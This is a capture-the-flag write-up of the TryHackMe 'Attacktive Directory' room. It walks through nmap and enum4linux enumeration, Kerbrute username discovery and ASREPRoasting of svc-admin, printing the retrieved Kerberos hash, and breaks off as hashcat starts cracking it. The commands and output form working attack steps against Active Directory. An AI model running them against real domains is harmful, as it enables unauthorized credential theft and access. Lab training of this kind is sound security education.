# Attacktive Directory

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Challenge
Difficulty: Medium
Tags: Windows
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Free
Description:
99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?
```

Room link: [https://tryhackme.com/room/attacktivedirectory](https://tryhackme.com/room/attacktivedirectory)

## Solution

### Task 1: Intro - Deploy The Machine

#### Accessing Attacktive Directory

To access the Virtual Machine, you will need to first connect to our network using OpenVPN. Here is a mini walkthrough of getting connected.

(Please note the browser-based machine will be able to access this machine, you will not need to connect to the VPN.)

---------------------------------------------------------------------------------------

To access the Virtual Machine, you will need to first connect to our network using OpenVPN. Here is a mini walkthrough of getting connected.

(Please note the browser-based machine will be able to access this machine, you will not need to connect to the VPN.)

![Download VPN Config](Images/Download_VPN_Config.png)

Return to your access page. You can verify you are connected by looking on your access page. Refresh the page. You should see a green tick next to Connected. It will also show you your internal IP address.

![Open VPN Status](Images/Open_VPN_Status.png)

You're now ready to start hacking!

Alternatively, you can deploy the In-Browser Kali or Attack Box and automatically be connected to the TryHackMe Network.

Once connected to the VPN, deploy the machine and get hacking!

---------------------------------------------------------------------------------------

### Task 2: Intro - Setup

#### Installing Impacket

Whether you're on the Kali 2019.3 or Kali 2021.1, Impacket can be a pain to install  correctly. Here's some instructions that may help you install it correctly!

**Note**: All of the tools mentioned in this task are installed on the AttackBox already. These steps are only required if you are setting up on your own VM. Impacket may also need you to use a python version >=3.7. In the AttackBox you can do this by running your command with `python3.9 <your command>`.

First, you will need to clone the Impacket Github repo onto your box. The following command will clone Impacket into /opt/impacket:

`git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket`

After the repo is cloned, you will notice several install related files, requirements.txt, and setup.py. A commonly skipped file during the installation is setup.py, this actually installs Impacket onto your system so you can use it and not have to worry about any dependencies.

To install the Python requirements for Impacket:

`pip3 install -r /opt/impacket/requirements.txt`

Once the requirements have finished installing, we can then run the python setup install script:

`cd /opt/impacket/ && python3 ./setup.py install`

After that, Impacket should be correctly installed now and it should be ready to use!

If you are still having issues, you can try the following script and see if this works:

```bash
sudo git clone https://github.com/SecureAuthCorp/impacket.git(opens in new tab) /opt/impacket
sudo pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket/ 
sudo pip3 install .
sudo python3 setup.py install
```

Credit for proper Impacket install instructions goes to Dragonar#0923 in the [THM Discord](https://discord.gg/tryhackme) <3

#### Installing Bloodhound and Neo4j

Bloodhound is another tool that we'll be utilizing while attacking Attacktive Directory. We'll cover specifcs of the tool later, but for now, we need to install two packages with Apt, those being bloodhound and neo4j. You can install it with the following command:

`apt install bloodhound neo4j`

 Now that it's done, you're ready to go!

#### Troubleshooting

If you are having issues installing Bloodhound and Neo4j, try issuing the following command:

`apt update && apt upgrade`

If you are having issues with Impacket, reach out to the [TryHackMe Discord](https://discord.gg/tryhackme) for help!

---------------------------------------------------------------------------------------

### Task 3: Enumeration - Welcome to Attacktive Directory

#### Welcome to Attacktive Directory

Welcome Dear User!

Thank you for doing my first room. I originally created this room for my final project in my Cyber Security degree program back in 2019. Since then, I've gone on to make several other rooms, even a Network for THM. In May 2021, I made the decision to renovate this room and make it more guided and less challenge based so there are more learning opportunities for others. I hope you enjoy it.

Love,

[Spooks](https://twitter.com/NekoS3c)

#### Enumeration

Basic enumeration starts out with an **nmap scan**. Nmap is a relatively complex utility that has been refined over the years to detect what ports are open on a device, what services are running, and even detect what operating system is running. It's important to note that not all services may be deteted correctly and not enumerated to it's fullest potential. Despite nmap being an overly complex utility, it cannot enumerate everything. Therefore after an initial nmap scan we'll be using other utilities to help us enumerate the services running on the device.

For more information on nmap, check out the [nmap room](https://tryhackme.com/room/furthernmap).

**Notes**: Flags for each user account are available for submission. You can retrieve the flags for user accounts via RDP (Note: the login format is `spookysec.local\User` at the Window's login prompt) and Administrator via Evil-WinRM.

---------------------------------------------------------------------------------------

We start by scanning the machine on all ports with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ export TARGET_IP=10.112.162.144

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ sudo nmap -sC -sV -p- $TARGET_IP                                            
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-27 13:56 +0200
Nmap scan report for 10.112.162.144
Host is up (0.027s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-27 11:57:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-04-27T11:58:25+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-04-27T11:58:15+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2026-04-26T11:49:25
|_Not valid after:  2026-10-26T11:49:25
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49840/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-27T11:58:17
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.48 seconds
```

We have the following main TCP-services running and available:

- Simple DNS Plus on port 53
- Microsoft IIS httpd 10.0 on port 80
- Microsoft Windows Kerberos on port 88
- Microsoft Windows RPC on port 135
- NetBIOS Session Service on port 139
- Microsoft Windows Active Directory LDAP on port 389 and 3268
- SMB on port 445
- KPASSWD (Kerberos Password) on port 464
- Microsoft Terminal Services on port 3389
- Microsoft HTTPAPI httpd 2.0 (WinRM) on port 5985

#### What tool will allow us to enumerate port 139/445?

Hint: Try using enum4linux.

To get more information via SMB we can enumerate with `enum4linux`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ enum4linux -a $TARGET_IP | tee enum4linux.txt
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Apr 27 14:23:57 2026

 =========================================( Target Information )=========================================
                                                                                                                                                                                                                        
Target ........... 10.112.162.144                                                                                                                                                                                       
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.112.162.144 )===========================
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        
[E] Can't find workgroup/domain                                                                                                                                                                                         
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        

 ===============================( Nbtstat Information for 10.112.162.144 )===============================
                                                                                                                                                                                                                        
Looking up status of 10.112.162.144                                                                                                                                                                                     
No reply from 10.112.162.144

 ==================================( Session Check on 10.112.162.144 )==================================
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        
[+] Server 10.112.162.144 allows sessions using username '', password ''                                                                                                                                                
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        
 ===============================( Getting domain SID for 10.112.162.144 )===============================
                                                                                                                                                                                                                        
Domain Name: THM-AD                                                                                                                                                                                                     
Domain Sid: S-1-5-21-3591857110-2884097990-301047963

[+] Host is part of a domain (not a workgroup)                                                                                                                                                                          
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        
 ==================================( OS information on 10.112.162.144 )==================================
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        
[E] Can't get OS info with smbclient                                                                                                                                                                                    
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        
[+] Got OS info for 10.112.162.144 from srvinfo:                                                                                                                                                                        
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED                                                                                                                                                  


 ======================================( Users on 10.112.162.144 )======================================
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                                                                                                                                    
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                                                                                                                     
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        
 ================================( Share Enumeration on 10.112.162.144 )================================
                                                                                                                                                                                                                        
do_connect: Connection to 10.112.162.144 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                                                                               

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.112.162.144                                                                                                                                                                          
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        
 ===========================( Password Policy Information for 10.112.162.144 )===========================
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        
[E] Unexpected error from polenum:                                                                                                                                                                                      
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        

[+] Attaching to 10.112.162.144 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.112.162.144)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient                                                                                                                                                                        
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        

 ======================================( Groups on 10.112.162.144 )======================================
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        
[+] Getting builtin groups:                                                                                                                                                                                             
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        
[+]  Getting builtin group memberships:                                                                                                                                                                                 
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        
[+]  Getting local groups:                                                                                                                                                                                              
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        
[+]  Getting local group memberships:                                                                                                                                                                                   
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        
[+]  Getting domain groups:                                                                                                                                                                                             
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        
[+]  Getting domain group memberships:                                                                                                                                                                                  
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        
 =================( Users on 10.112.162.144 via RID cycling (RIDS: 500-550,1000-1050) )=================
                                                                                                                                                                                                                        
                                                                                                                                                                                                                        
[I] Found new SID:                                                                                                                                                                                                      
S-1-5-21-3591857110-2884097990-301047963                                                                                                                                                                                

[I] Found new SID:                                                                                                                                                                                                      
S-1-5-21-3591857110-2884097990-301047963                                                                                                                                                                                

[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''                                                                                                            
                                                                                                                                                                                                                        
S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)                                                                                                                                
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)

[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''                                                                                                             
                                                                                                                                                                                                                        
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)                                                                                                                                          
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)

 ==============================( Getting printer info for 10.112.162.144 )==============================
                                                                                                                                                                                                                        
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                                                                                                                                 


enum4linux complete on Mon Apr 27 14:25:58 2026
```

A more modern tool is `enum4linux-ng` that also enumerate via LDAP

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ enum4linux-ng $TARGET_IP | tee enum4linux-ng.txt
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.112.162.144
[*] Username ......... ''
[*] Random Username .. 'qylamzdh'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =======================================
|    Listener Scan on 10.112.162.144    |
 =======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ======================================================
|    Domain Information via LDAP for 10.112.162.144    |
 ======================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: spookysec.local

 =============================================================
|    NetBIOS Names and Workgroup/Domain for 10.112.162.144    |
 =============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ===========================================
|    SMB Dialect Check on 10.112.162.144    |
 ===========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                                                                                                                                     
  SMB 1.0: false                                                                                                                                                                                                        
  SMB 2.02: true                                                                                                                                                                                                        
  SMB 2.1: true                                                                                                                                                                                                         
  SMB 3.0: true                                                                                                                                                                                                         
  SMB 3.1.1: true                                                                                                                                                                                                       
Preferred dialect: SMB 3.0                                                                                                                                                                                              
SMB1 only: false                                                                                                                                                                                                        
SMB signing required: true                                                                                                                                                                                              

 =============================================================
|    Domain Information via SMB session for 10.112.162.144    |
 =============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: ATTACKTIVEDIREC
NetBIOS domain name: THM-AD
DNS domain: spookysec.local
FQDN: AttacktiveDirectory.spookysec.local
Derived membership: domain member
Derived domain: THM-AD

 ===========================================
|    RPC Session Check on 10.112.162.144    |
 ===========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 =====================================================
|    Domain Information via RPC for 10.112.162.144    |
 =====================================================
[+] Domain: THM-AD
[+] Domain SID: S-1-5-21-3591857110-2884097990-301047963
[+] Membership: domain member

 =================================================
|    OS Information via RPC for 10.112.162.144    |
 =================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                                                                                                                                
OS version: '10.0'                                                                                                                                                                                                      
OS release: '1809'                                                                                                                                                                                                      
OS build: '17763'                                                                                                                                                                                                       
Native OS: not supported                                                                                                                                                                                                
Native LAN manager: not supported                                                                                                                                                                                       
Platform id: null                                                                                                                                                                                                       
Server type: null                                                                                                                                                                                                       
Server type string: null                                                                                                                                                                                                

 =======================================
|    Users via RPC on 10.112.162.144    |
 =======================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 ========================================
|    Groups via RPC on 10.112.162.144    |
 ========================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 ========================================
|    Shares via RPC on 10.112.162.144    |
 ========================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 ===========================================
|    Policies via RPC for 10.112.162.144    |
 ===========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 ===========================================
|    Printers via RPC for 10.112.162.144    |
 ===========================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 9.20 seconds
```

Answer: `enum4linux`

#### What is the NetBIOS-Domain Name of the machine?

From the nmap scan

```bash
<---snip--->
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-04-27T11:58:25+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
<---snip--->
```

or the enum4linux-ng output

```bash
<---snip--->
 =============================================================
|    Domain Information via SMB session for 10.112.162.144    |
 =============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: ATTACKTIVEDIREC
NetBIOS domain name: THM-AD
<---snip--->
```

Answer: `THM-AD`

#### What invalid TLD do people commonly use for their Active Directory Domain?

Hint: Spoiler: The full AD domain is spookysec.local

From the nmap scan

```bash
<---snip--->
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
<---snip--->
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
<---snip--->
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
<---snip--->
```

Answer: `.local`

---------------------------------------------------------------------------------------

### Task 4: Enumeration - Enumerating Users via Kerberos

#### Introduction

A whole host of other services are running, including **Kerberos**. Kerberos is a key authentication service within Active Directory. With this port open, we can use a tool called [Kerbrute](https://github.com/ropnop/kerbrute/releases) (by Ronnie Flathers [@ropnop](https://twitter.com/ropnop)) to brute force discovery of users, passwords and even password spray!

**Note**: Several users have informed me that the latest version of Kerbrute does not contain the UserEnum flag in Kerbrute, if that is the case with the version you have selected, try a older version!

#### Enumeration via Kerberos

For this box, a modified [User List](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt) and [Password List](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt) will be used to cut down on time of enumeration of users and password hash cracking. It is **NOT** recommended to brute force credentials due to account lockout policies that we cannot enumerate on the domain controller.

---------------------------------------------------------------------------------------

#### What command within Kerbrute will allow us to enumerate valid usernames?

Hint: ./kerbrute -h may help you

Answer: `userenum`

#### What notable account is discovered? (These should jump out at you)

We enumerate with `kerbrute` and the supplied user file

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ kerbrute userenum --dc $TARGET_IP -d spookysec.local userlist.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/27/26 - Ronnie Flathers @ropnop

2026/04/27 14:57:10 >  Using KDC(s):
2026/04/27 14:57:10 >   10.112.162.144:88

2026/04/27 14:57:10 >  [+] VALID USERNAME:       james@spookysec.local
2026/04/27 14:57:10 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2026/04/27 14:57:11 >  [+] VALID USERNAME:       James@spookysec.local
2026/04/27 14:57:11 >  [+] VALID USERNAME:       robin@spookysec.local
2026/04/27 14:57:13 >  [+] VALID USERNAME:       darkstar@spookysec.local
2026/04/27 14:57:14 >  [+] VALID USERNAME:       administrator@spookysec.local
2026/04/27 14:57:17 >  [+] VALID USERNAME:       backup@spookysec.local
2026/04/27 14:57:18 >  [+] VALID USERNAME:       paradox@spookysec.local
2026/04/27 14:57:26 >  [+] VALID USERNAME:       JAMES@spookysec.local
2026/04/27 14:57:29 >  [+] VALID USERNAME:       Robin@spookysec.local
2026/04/27 14:57:47 >  [+] VALID USERNAME:       Administrator@spookysec.local
2026/04/27 14:58:20 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2026/04/27 14:58:30 >  [+] VALID USERNAME:       Paradox@spookysec.local
2026/04/27 14:59:06 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2026/04/27 14:59:16 >  [+] VALID USERNAME:       ori@spookysec.local
2026/04/27 14:59:36 >  [+] VALID USERNAME:       ROBIN@spookysec.local
2026/04/27 15:00:22 >  Done! Tested 73317 usernames (16 valid) in 192.058 seconds
```

Answer: `svc-admin`

#### What is the other notable account is discovered? (These should jump out at you)

Answer: `backup`

---------------------------------------------------------------------------------------

### Task 5: Exploitation - Abusing Kerberos

#### Introduction

After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called **ASREPRoasting**. ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account **does not** need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

#### Retrieving Kerberos Tickets

[Impacket](https://github.com/SecureAuthCorp/impacket) has a tool called "GetNPUsers.py" (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.

**Remember**: Impacket may also need you to use a python version >=3.7. In the AttackBox you can do this by running your command with `python3.9 /opt/impacket/examples/GetNPUsers.py`.

---------------------------------------------------------------------------------------

We have two user accounts that we could potentially query a ticket from.

#### Which user account can you query a ticket from with no password?

We query both users and provide blank/no passwords

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ impacket-GetNPUsers -dc-ip $TARGET_IP -no-pass spookysec.local/svc-admin
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:d13488f096ca4f71e272685413a14b15$8d4c1ac0b0f68058e89da48673e2966be090dafefe10576c9c82f62172c8016c4574df737a05e16b6ad7c1e1cdffada894fe1c2f8f9a3e42fa84d283d589347b03de4e95381dc08babf56d00f63030abb1c694b53c30e414490366c3d4090e292622c63e67f0b4af1dc46e10da837cb461a8695763fa961b99c59135ceb62b9b68f48558d25962a3d58136f218516489a694ca8f4734d1296492a7cb49ec61dfbdfc56baa65ea3ad19254d1175ba62b71079f10d37a393a6894d0453cc3ae9884a3fd456801eb52d8230a348d588d14e80ac2852e0c8fb94110ee2ac1b9dc3b9ad4c066b1eac5acd5ca7f1501fd4d654fc75

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ impacket-GetNPUsers -dc-ip $TARGET_IP -no-pass spookysec.local/backup   
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for backup
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Answer: `svc-admin`

#### Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)

Hint: `https://hashcat.net/wiki/doku.php?id=example_hashes` and searching for the first part will help!

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ hashcat --help | grep -i kerberos 
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
```

Answer: `Kerberos 5 AS-REP etype 23`

#### What mode is the hash?

See output above

Answer: `18200`

#### Now crack the hash with the modified password list provided, what is the user accounts password?

We save the hash to a file and crack it with `hashcat` and the supplied wordlist

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ vi asrep_hash.txt                                               

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ cat asrep_hash.txt                                                                                                              
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:d13488f096ca4f71e272685413a14b15$8d4c1ac0b0f68058e89da48673e2966be090dafefe10576c9c82f62172c8016c4574df737a05e16b6ad7c1e1cdffada894fe1c2f8f9a3e42fa84d283d589347b03de4e95381dc08babf56d00f63030abb1c694b53c30e414490366c3d4090e292622c63e67f0b4af1dc46e10da837cb461a8695763fa961b99c59135ceb62b9b68f48558d25962a3d58136f218516489a694ca8f4734d1296492a7cb49ec61dfbdfc56baa65ea3ad19254d1175ba62b71079f10d37a393a6894d0453cc3ae9884a3fd456801eb52d8230a348d588d14e80ac2852e0c8fb94110ee2ac1b9dc3b9ad4c066b1eac5acd5ca7f1501fd4d654fc75

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ hashcat -m 18200 asrep_hash.txt passwordlist.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz, 2913/5890 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache built:
* Filename..: passwordlist.txt
* Passwords.: 70188
* Bytes.....: 569236
* Keyspace..: 70188
* Runtime...: 0 secs

